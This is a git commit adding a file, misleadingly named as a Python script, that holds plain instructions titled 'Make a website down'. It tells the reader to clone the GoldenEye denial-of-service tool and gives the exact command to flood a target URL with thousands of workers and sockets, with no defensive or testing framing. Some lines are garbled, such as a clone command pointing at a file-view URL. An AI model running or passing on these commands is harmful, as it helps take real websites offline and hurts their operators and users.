00aab7c65dac60de1f7a8858c7b2599654788724
LAKSHMI NARAYANAN R <142524733+lakshmi-narayanan-dev@users.noreply.github.com>
2023-12-20 11:28:46 +0530

    Create make_A_Website_Down.py

---
+++ make_A_Website_Down.py
@@ -0,0 +1,11 @@
+-------------------------------
+Make a website down
+-------------------------------
+
+Git clone from https://github.com/jseidl/GoldenEye/blob/master/goldeneye.py
+cd Folder && ls 
+./goldeneye .py
+./goldeneye https://target-url -w 10000 -s 12000
+./goldeneye -h for help and to know more about the tool
+
+https://linuxhint.com/detect_linux_system_hacked/
